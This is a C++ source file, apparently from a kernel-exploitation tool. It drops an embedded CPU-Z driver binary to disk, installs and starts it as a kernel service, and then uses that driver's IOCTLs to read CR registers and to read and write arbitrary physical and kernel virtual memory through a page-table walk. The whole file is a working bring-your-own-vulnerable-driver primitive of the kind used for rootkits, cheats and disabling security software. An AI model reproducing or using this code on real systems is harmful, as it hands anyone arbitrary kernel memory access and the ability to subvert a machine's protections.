#include "CPUZ.h"
#include "CPUZShellcode.h"

#define LODWORD(l)       ((DWORD)(((DWORD_PTR)(l)) & 0xffffffff))
#define HIDWORD(l)       ((DWORD)((((DWORD_PTR)(l)) >> 32) & 0xffffffff))

struct input_read_mem
{
	uint32_t address_high;
	uint32_t address_low;
	uint32_t length;
	uint32_t buffer_high;
	uint32_t buffer_low;
};

struct input_write_mem
{
	uint32_t address_high;
	uint32_t address_low;
	uint32_t value;
};

struct input_write_mem_byte
{
	uint32_t address_high;
	uint32_t address_low;
	uint8_t value;
};

struct output
{
	uint32_t operation;
	uint32_t buffer_low;
};

CPUZ::CPUZ()
{
	this->deviceHandle = NULL;
	this->serviceHandle = NULL;
}

bool CPUZ::UnloadDriver()
{
	SC_HANDLE SCManager;
	SERVICE_STATUS serviceStatus;

	if (this->deviceHandle != INVALID_HANDLE_VALUE)
		CloseHandle(deviceHandle);

	if (serviceHandle != INVALID_HANDLE_VALUE)
	{
		SCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
		this->serviceHandle = OpenService(SCManager, this->driverDisplayName.c_str(), SERVICE_ALL_ACCESS | SERVICE_START | DELETE | SERVICE_STOP);

		if (this->serviceHandle)
		{
			if (!ControlService(this->serviceHandle, SERVICE_CONTROL_STOP, &serviceStatus))
			{
				CloseServiceHandle(this->serviceHandle);
				CloseServiceHandle(SCManager);
				return false;
			}

			while (serviceStatus.dwCurrentState != SERVICE_STOPPED) {}

			if (!DeleteService(this->serviceHandle))
			{
				CloseServiceHandle(this->serviceHandle);
				CloseServiceHandle(SCManager);
				return false;
			}

			CloseServiceHandle(this->serviceHandle);
		}
	}

	return true;
}

bool CPUZ::LoadDriver()
{
	SC_HANDLE SCManager;
	SERVICE_STATUS serviceStatus;
	HANDLE file;
	DWORD io;

	if (!PathFileExists(this->driverFileName.c_str())) {
		file = CreateFile(this->driverFileName.c_str(), FILE_GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (!WriteFile(file, CPUZShellcode, sizeof(CPUZShellcode), &io, nullptr))
		{
			CloseHandle(file);
			return false;
		}

		CloseHandle(file);
	}

	SCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	this->serviceHandle = OpenService(SCManager, this->driverDisplayName.c_str(), SERVICE_ALL_ACCESS | SERVICE_START | DELETE | SERVICE_STOP);

	if (this->serviceHandle)
	{
		if (!ControlService(this->serviceHandle, SERVICE_CONTROL_STOP, &serviceStatus))
		{
			CloseServiceHandle(this->serviceHandle);
			CloseServiceHandle(SCManager);
			return false;
		}

		while (serviceStatus.dwCurrentState != SERVICE_STOPPED) {}

		if (!DeleteService(this->serviceHandle))
		{
			CloseServiceHandle(this->serviceHandle);
			CloseServiceHandle(SCManager);
			return false;
		}

		CloseServiceHandle(this->serviceHandle);
	}

	do
	{
		this->serviceHandle = CreateService(SCManager, this->driverDisplayName.c_str(), this->driverDisplayName.c_str(), SERVICE_ALL_ACCESS | SERVICE_START | DELETE | SERVICE_STOP,
			SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, this->driverFileName.c_str(), NULL, NULL, NULL, NULL, NULL);
	} while (GetLastError() == ERROR_SERVICE_MARKED_FOR_DELETE);

	if (!StartService(this->serviceHandle, 0, NULL))
	{
		DWORD error = GetLastError();
		//cout << error << endl;
		DeleteService(this->serviceHandle);
		return false;
	}

	return true;
}

bool CPUZ::LoadDevice()
{
	if (!this->deviceHandle)
	{
		IO_STATUS_BLOCK ioStatus;
		NTSTATUS status;

		UNICODE_STRING deviceName = UNICODE_STRING{ (USHORT)(driverDeviceName.size() * sizeof(wchar_t)), (USHORT)(driverDeviceName.size() * sizeof(wchar_t)), const_cast<PWSTR>(driverDeviceName.c_str()) };
		OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES{ sizeof(OBJECT_ATTRIBUTES), nullptr, &deviceName, 0, nullptr, nullptr };

		status = NtOpenFile(&this->deviceHandle, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objAttr, &ioStatus, 0, OPEN_EXISTING);

		if (!NT_SUCCESS(status))
		{
			do
			{
				status = NtOpenFile(&this->deviceHandle, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objAttr, &ioStatus, 0, OPEN_EXISTING);
				Sleep(100);
			} while (!NT_SUCCESS(status));
		}
	}

	return deviceHandle != NULL;
}

uint64_t CPUZ::TranslateLinearAddress(uint64_t directoryTableBase, LPVOID virtualAddress)
{
	auto va = (uint64_t)virtualAddress;

	auto PML4 = (USHORT)((va >> 39) & 0x1FF); //<! PML4 Entry Index
	auto DirectoryPtr = (USHORT)((va >> 30) & 0x1FF); //<! Page-Directory-Pointer Table Index
	auto Directory = (USHORT)((va >> 21) & 0x1FF); //<! Page Directory Table Index
	auto Table = (USHORT)((va >> 12) & 0x1FF); //<! Page Table Index

	// 
	// Read the PML4 Entry. DirectoryTableBase has the base address of the table.
	// It can be read from the CR3 register or from the kernel process object.
	// 
	auto PML4E = ReadPhysicalAddress<uint64_t>(directoryTableBase + PML4 * sizeof(ULONGLONG));

	if (PML4E == 0)
		return 0;

	// 
	// The PML4E that we read is the base address of the next table on the chain,
	// the Page-Directory-Pointer Table.
	// 
	auto PDPTE = ReadPhysicalAddress<uint64_t>((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(ULONGLONG));

	if (PDPTE == 0)
		return 0;

	//Check the PS bit
	if ((PDPTE & (1 << 7)) != 0) {
		// If the PDPTE’s PS flag is 1, the PDPTE maps a 1-GByte page. The
		// final physical address is computed as follows:
		// — Bits 51:30 are from the PDPTE.
		// — Bits 29:0 are from the original va address.
		return (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);
	}

	//
	// PS bit was 0. That means that the PDPTE references the next table
	// on the chain, the Page Directory Table. Read it.
	// 
	auto PDE = ReadPhysicalAddress<uint64_t>((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(ULONGLONG));

	if (PDE == 0)
		return 0;

	if ((PDE & (1 << 7)) != 0) {
		// If the PDE’s PS flag is 1, the PDE maps a 2-MByte page. The
		// final physical address is computed as follows:
		// — Bits 51:21 are from the PDE.
		// — Bits 20:0 are from the original va address.
		return (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
	}

	//
	// PS bit was 0. That means that the PDE references a Page Table.
	// 
	auto PTE = ReadPhysicalAddress<uint64_t>((PDE & 0xFFFFFFFFFF000) + Table * sizeof(ULONGLONG));

	if (PTE == 0)
		return 0;

	//
	// The PTE maps a 4-KByte page. The
	// final physical address is computed as follows:
	// — Bits 51:12 are from the PTE.
	// — Bits 11:0 are from the original va address.
	return (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
}

uint64_t CPUZ::ReadCR0()
{
	unsigned long io = ULONG {0};
	uint32_t cr = uint32_t{0};
	uint64_t value = uint64_t{0};

	DeviceIoControl(this->deviceHandle, IOCTL_READ_CR, &cr, sizeof(cr), &value, sizeof(value), &io, nullptr);

	return value;
}

uint64_t CPUZ::ReadCR2()
{
	unsigned long io = ULONG{0};
	uint32_t cr = uint32_t{2};
	uint64_t value = uint64_t{0};

	DeviceIoControl(this->deviceHandle, IOCTL_READ_CR, &cr, sizeof(cr), &value, sizeof(value), &io, nullptr);

	return value;
}

uint64_t CPUZ::ReadCR3()
{
	unsigned long io = ULONG{0};
	uint32_t cr = uint32_t{3};
	uint64_t value = uint64_t{0};

	DeviceIoControl(this->deviceHandle, IOCTL_READ_CR, &cr, sizeof(cr), &value, sizeof(value), &io, nullptr);

	return value;
}

bool CPUZ::ReadPhysicalAddress(uint64_t address, LPVOID buf, size_t len)
{
	unsigned long io = ULONG{ 0 };
	input_read_mem in = input_read_mem{};
	output out = output{};

	if (address == 0 || buf == nullptr)
		return false;

	in.address_high = HIDWORD(address);
	in.address_low = LODWORD(address);
	in.length = (std::uint32_t)len;
	in.buffer_high = HIDWORD(buf);
	in.buffer_low = LODWORD(buf);

	return !!DeviceIoControl(this->deviceHandle, IOCTL_READ_MEM, &in, sizeof(in), &out, sizeof(out), &io, nullptr);
}

bool CPUZ::WritePhysicalAddress(uint64_t address, LPVOID buf, size_t len)
{
	unsigned long io = ULONG{ 0 };
	input_write_mem in = input_write_mem{};
	output out = output{};

	if (address == 0 || buf == nullptr)
		return false;

	if (len == 4) 
	{
		in.address_high = HIDWORD(address);
		in.address_low = LODWORD(address);
		in.value = *(std::uint32_t*)buf;
		
		return !!DeviceIoControl(this->deviceHandle, IOCTL_WRITE_MEM, &in, sizeof(in), &out, sizeof(out), &io, nullptr);
	}
	else if (len > 4) 
	{
		for (int i = 0; i < len / 4; i++) 
		{
			in.address_high = HIDWORD(address + 4 * i);
			in.address_low = LODWORD(address + 4 * i);
			in.value = ((std::uint32_t*)buf)[i];
			if (!DeviceIoControl(this->deviceHandle, IOCTL_WRITE_MEM, &in, sizeof(in), &out, sizeof(out), &io, nullptr))
				return false;
		}
		return true;
	}
	else 
	{
		input_write_mem_byte input = input_write_mem_byte{};
		input.address_high = HIDWORD(address);
		input.address_low = LODWORD(address);
		input.value = *(std::uint8_t*)buf;

		return !!DeviceIoControl(this->deviceHandle, IOCTL_WRITE_MEM, &input, sizeof(input), &out, sizeof(out), &io, nullptr);
	}
}

bool CPUZ::ReadSystemAddress(LPVOID address, LPVOID buf, size_t len)
{
	const auto dirbase = ReadCR3();
	const auto phys = TranslateLinearAddress(dirbase, address);

	if (phys == 0)
		return false;

	return ReadPhysicalAddress(phys, buf, len);
}

bool CPUZ::WriteSystemAddress(LPVOID address, LPVOID buf, size_t len)
{
	const auto dirbase = ReadCR3();
	const auto phys = TranslateLinearAddress(dirbase, address);

	if (phys == 0)
		return false;

	return WritePhysicalAddress(phys, buf, len);
}